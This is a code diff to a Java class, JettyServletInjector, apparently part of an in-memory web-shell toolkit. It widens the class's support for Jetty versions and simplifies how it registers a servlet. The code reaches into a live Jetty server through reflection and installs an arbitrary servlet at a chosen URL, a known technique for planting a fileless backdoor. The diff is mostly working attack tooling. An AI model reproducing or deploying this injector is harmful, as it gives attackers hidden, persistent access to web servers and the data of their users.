@@ -6,7 +6,6 @@ import java.io.IOException;
 import java.lang.reflect.*;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Map;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
@@ -99,48 +98,42 @@ public class JettyServletInjector {
     public void inject(Object context, Object servlet) throws Exception {
         Object servletHandler = getFieldValue(context, "_servletHandler");
 
-        // 1. 判断是否已经注入
-        if (isInjected(servletHandler)) {
+        if (invokeMethod(servletHandler, "getServlet", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             System.out.println("servlet is already injected");
             return;
         }
 
         ClassLoader classLoader = context.getClass().getClassLoader();
 
+        String[] classNames = new String[]{
+                "org.eclipse.jetty.servlet.ServletHolder",
+                "org.eclipse.jetty.ee8.servlet.ServletHolder",
+                "org.eclipse.jetty.ee9.servlet.ServletHolder",
+                "org.eclipse.jetty.ee10.servlet.ServletHolder",
+                "org.mortbay.jetty.servlet.ServletHolder",
+        };
+
         Class<?> servletHolderClass = null;
-        try {
-            servletHolderClass = classLoader.loadClass("org.eclipse.jetty.servlet.ServletHolder");
-        } catch (ClassNotFoundException e) {
-            servletHolderClass = classLoader.loadClass("org.mortbay.jetty.servlet.ServletHolder");
+
+        for (String className : classNames) {
+            try {
+                servletHolderClass = context.getClass().getClassLoader().loadClass(className);
+            } catch (ClassNotFoundException ignored) {
+            }
         }
+
+        if (servletHolderClass == null) {
+            throw new ClassNotFoundException("ServletHodler");
+        }
+
         Constructor<?> servletHolderConstructor = servletHolderClass.getDeclaredConstructor();
         servletHolderConstructor.setAccessible(true);
         Object servletHolder = servletHolderConstructor.newInstance();
         invokeMethod(servletHolder, "setServlet", new Class[]{getServletClass(classLoader)}, new Object[]{servlet});
         invokeMethod(servletHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(servletHandler, "addServlet", new Class[]{servletHolderClass}, new Object[]{servletHolder});
-        Class<?> servletMappingClass = null;
-        try {
-            servletMappingClass = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
-        } catch (ClassNotFoundException e) {
-            servletMappingClass = classLoader.loadClass("org.mortbay.jetty.servlet.ServletMapping");
-        }
-        Constructor<?> servletMappingConstructor = servletMappingClass.getDeclaredConstructor();
-        servletMappingConstructor.setAccessible(true);
-        Object servletMapping = servletMappingConstructor.newInstance();
-        invokeMethod(servletMapping, "setServletName", new Class[]{String.class}, new Object[]{getClassName()});
-        invokeMethod(servletMapping, "setPathSpecs", new Class[]{String[].class}, new Object[]{new String[]{getUrlPattern()}});
-        invokeMethod(servletHandler, "addServletMapping", new Class[]{servletMappingClass}, new Object[]{servletMapping});
+        invokeMethod(servletHandler, "addServletWithMapping", new Class[]{servletHolderClass, String.class}, new Object[]{servletHolder, getUrlPattern()});
         System.out.println("servlet inject successful");
-    }
-
-    @SuppressWarnings("unchecked")
-    public boolean isInjected(Object servletHandler) throws Exception {
-        Map<String, Object> servletNameMap = (Map<String, Object>) getFieldValue(servletHandler, "_servletNameMap");
-        if (servletNameMap == null) {
-            return false;
-        }
-        return servletNameMap.containsKey(getClassName());
     }
 
 
